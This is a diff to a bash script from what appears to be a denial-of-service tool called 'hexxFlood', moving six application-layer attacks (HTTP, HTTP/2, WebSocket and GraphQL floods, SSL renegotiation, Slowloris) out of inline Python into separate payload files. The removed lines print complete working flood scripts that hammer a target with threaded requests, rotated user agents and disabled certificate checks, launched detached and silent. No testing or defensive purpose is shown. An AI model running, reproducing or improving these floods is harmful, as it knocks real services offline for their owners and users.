@@ -8,10 +8,10 @@
 # ============================================================
 
 # ---- shared Python-flood launcher --------------------------
-# Every Layer-7 flood generates a /tmp/*.py script and runs it the same way:
-# prefer the hexxFlood venv interpreter (which carries h2/websocket-client/
-# requests), else fall back to the system python3. Centralised here so the six
-# flood functions don't each repeat the interpreter-selection + detach boilerplate.
+# Each Layer-7 flood is a real script under payloads/ (see $PAYLOAD_DIR, set by
+# the entrypoint). They all run the same way: prefer the hexxFlood venv
+# interpreter (which carries h2/websocket-client/requests), else fall back to the
+# system python3. Centralised here so the six flood functions stay one line each.
 
 hexx_python() {
     if [ -x /opt/hexxFlood-venv/bin/python ]; then
@@ -24,6 +24,11 @@ hexx_python() {
 # launch_python_flood <script.py> [args...] — run detached, fully silent.
 launch_python_flood() {
     local script="$1"; shift
+    if [ ! -f "$script" ]; then
+        echo -e "${RED}❌ Missing payload: $script${NC}" >&2
+        echo -e "${YELLOW}   Re-run setup.sh or reinstall — payloads/ must ship with the tool.${NC}" >&2
+        return 1
+    fi
     $DETACH "$(hexx_python)" "$script" "$@" </dev/null >/dev/null 2>&1 &
 }
 
@@ -35,70 +40,7 @@ http_flood() {
     echo -e "${YELLOW}🌐 Starting HTTP flood on $url${NC}"
     echo -e "${YELLOW}   Threads: $threads${NC}"
     
-    cat > /tmp/http_flood.py << 'PYEOF'
-import sys, time, threading, urllib.request, urllib.error, ssl, random
-from concurrent.futures import ThreadPoolExecutor
-
-url = sys.argv[1]
-threads = int(sys.argv[2])
-duration = int(sys.argv[3])
-
-ssl._create_default_https_context = ssl._create_unverified_context
-
-USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
-]
-
-def make_request():
-    headers = {
-        'User-Agent': random.choice(USER_AGENTS),
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate',
-        'Connection': 'keep-alive',
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache'
-    }
-    try:
-        req = urllib.request.Request(url, headers=headers)
-        with urllib.request.urlopen(req, timeout=5) as response:
-            return response.read()
-    except:
-        return None
-
-def worker():
-    while running:
-        try:
-            make_request()
-        except:
-            pass
-
-running = True
-start_time = time.time()
-
-print(f"Starting HTTP flood on {url} with {threads} threads")
-
-with ThreadPoolExecutor(max_workers=threads) as executor:
-    futures = [executor.submit(worker) for _ in range(threads)]
-    if duration > 0:
-        time.sleep(duration)
-        running = False
-    else:
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            running = False
-    for future in futures:
-        future.cancel()
-
-print("HTTP flood stopped")
-PYEOF
-
-    launch_python_flood /tmp/http_flood.py "$url" "$threads" "$duration"
+    launch_python_flood "$PAYLOAD_DIR/http_flood.py" "$url" "$threads" "$duration"
 }
 
 # ============================================================
@@ -113,69 +55,7 @@ generate_http2_flood() {
     
     echo -e "${YELLOW}🔷 Starting HTTP/2 flood on $target:$port${NC}"
     
-    cat > /tmp/http2_flood.py << 'PYEOF'
-import sys, time, threading, ssl, socket, random
-try:
-    import h2.connection
-    import h2.config
-    HAS_H2 = True
-except ImportError:
-    HAS_H2 = False
-
-target = sys.argv[1]
-port = int(sys.argv[2])
-threads = int(sys.argv[3])
-duration = int(sys.argv[4])
-
-if not HAS_H2:
-    print("HTTP/2 requires h2 library: pip install h2")
-    sys.exit(1)
-
-USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-]
-
-def http2_flood():
-    while running:
-        try:
-            config = h2.config.H2Configuration(client_side=True)
-            conn = h2.connection.H2Connection(config=config)
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((target, port))
-            conn.initiate_connection()
-            sock.send(conn.data_to_send())
-            
-            for stream_id in range(1, 100):
-                headers = [
-                    (':method', 'GET'),
-                    (':path', '/'),
-                    (':scheme', 'https'),
-                    (':authority', target),
-                    ('user-agent', random.choice(USER_AGENTS)),
-                ]
-                conn.send_headers(stream_id, headers, end_stream=True)
-                sock.send(conn.data_to_send())
-            sock.close()
-        except:
-            pass
-
-running = True
-for i in range(threads):
-    threading.Thread(target=http2_flood).start()
-
-if duration > 0:
-    time.sleep(duration)
-    running = False
-else:
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        running = False
-PYEOF
-
-    launch_python_flood /tmp/http2_flood.py "$target" "$port" "$threads" "$duration"
+    launch_python_flood "$PAYLOAD_DIR/http2_flood.py" "$target" "$port" "$threads" "$duration"
 }
 
 # ============================================================
@@ -190,50 +70,7 @@ generate_websocket_flood() {
     
     echo -e "${YELLOW}🔷 Starting WebSocket flood on $target:$port${NC}"
     
-    cat > /tmp/websocket_flood.py << 'PYEOF'
-import sys, time, threading, random
-try:
-    import websocket
-    HAS_WS = True
-except ImportError:
-    HAS_WS = False
-
-target = sys.argv[1]
-port = int(sys.argv[2])
-threads = int(sys.argv[3])
-duration = int(sys.argv[4])
-
-if not HAS_WS:
-    print("WebSocket requires websocket-client: pip install websocket-client")
-    sys.exit(1)
-
-def websocket_flood():
-    while running:
-        try:
-            ws = websocket.WebSocket()
-            ws.connect(f"ws://{target}:{port}/ws")
-            for i in range(100):
-                ws.send(f"ping_{i}")
-            ws.close()
-        except:
-            pass
-
-running = True
-for i in range(threads):
-    threading.Thread(target=websocket_flood).start()
-
-if duration > 0:
-    time.sleep(duration)
-    running = False
-else:
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        running = False
-PYEOF
-
-    launch_python_flood /tmp/websocket_flood.py "$target" "$port" "$threads" "$duration"
+    launch_python_flood "$PAYLOAD_DIR/websocket_flood.py" "$target" "$port" "$threads" "$duration"
 }
 
 # ============================================================
@@ -248,62 +85,7 @@ generate_graphql_flood() {
     
     echo -e "${YELLOW}🔷 Starting GraphQL flood on $target:$port${NC}"
     
-    cat > /tmp/graphql_flood.py << 'PYEOF'
-import sys, time, threading, json, random
-try:
-    import requests
-    HAS_REQUESTS = True
-except ImportError:
-    HAS_REQUESTS = False
-
-target = sys.argv[1]
-port = int(sys.argv[2])
-threads = int(sys.argv[3])
-duration = int(sys.argv[4])
-
-if not HAS_REQUESTS:
-    print("GraphQL requires requests: pip install requests")
-    sys.exit(1)
-
-QUERIES = [
-    "query { __schema { types { name fields { name } } } }",
-    "query { __typename }",
-    "query { allUsers { id name email } }",
-    "mutation { createUser(input: {name:\"test\"}) { id } }",
-]
-
-def graphql_flood():
-    while running:
-        try:
-            query = random.choice(QUERIES)
-            url = f"http://{target}:{port}/graphql"
-            if port == 443:
-                url = f"https://{target}/graphql"
-            response = requests.post(
-                url,
-                json={"query": query},
-                headers={"Content-Type": "application/json"},
-                timeout=5
-            )
-        except:
-            pass
-
-running = True
-for i in range(threads):
-    threading.Thread(target=graphql_flood).start()
-
-if duration > 0:
-    time.sleep(duration)
-    running = False
-else:
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        running = False
-PYEOF
-
-    launch_python_flood /tmp/graphql_flood.py "$target" "$port" "$threads" "$duration"
+    launch_python_flood "$PAYLOAD_DIR/graphql_flood.py" "$target" "$port" "$threads" "$duration"
 }
 
 # ============================================================
@@ -317,40 +99,7 @@ ssl_renegotiation_attack() {
     
     echo -e "${YELLOW}🔷 Starting SSL renegotiation attack on $target:$port${NC}"
     
-    cat > /tmp/ssl_reneg.py << 'PYEOF'
-import sys, time, threading, ssl, socket
-
-target = sys.argv[1]
-port = int(sys.argv[2])
-threads = int(sys.argv[3])
-
-def ssl_reneg():
-    while running:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((target, port))
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
-            ssl_sock = context.wrap_socket(sock, server_hostname=target)
-            for _ in range(50):
-                ssl_sock.do_handshake()
-            ssl_sock.close()
-        except:
-            pass
-
-running = True
-for i in range(threads):
-    threading.Thread(target=ssl_reneg).start()
-
-try:
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    running = False
-PYEOF
-
-    launch_python_flood /tmp/ssl_reneg.py "$target" "$port" "$threads"
+    launch_python_flood "$PAYLOAD_DIR/ssl_reneg.py" "$target" "$port" "$threads"
 }
 
 # ============================================================
@@ -364,39 +113,7 @@ slowloris_attack() {
     
     echo -e "${YELLOW}🔷 Starting Slowloris attack on $target:$port${NC}"
     
-    cat > /tmp/slowloris.py << 'PYEOF'
-import sys, time, threading, socket, random
-
-target = sys.argv[1]
-port = int(sys.argv[2])
-threads = int(sys.argv[3])
-
-def slowloris():
-    while running:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((target, port))
-            sock.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode())
-            sock.send(f"Host: {target}\r\n".encode())
-            sock.send("User-Agent: Mozilla/5.0\r\n".encode())
-            while running:
-                sock.send(f"X-Header: {random.randint(0, 1000)}\r\n".encode())
-                time.sleep(15)
-        except:
-            pass
-
-running = True
-for i in range(threads):
-    threading.Thread(target=slowloris).start()
-
-try:
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    running = False
-PYEOF
-
-    launch_python_flood /tmp/slowloris.py "$target" "$port" "$threads"
+    launch_python_flood "$PAYLOAD_DIR/slowloris.py" "$target" "$port" "$threads"
 }
 
 # ---- launch dispatch ---------------------------------------
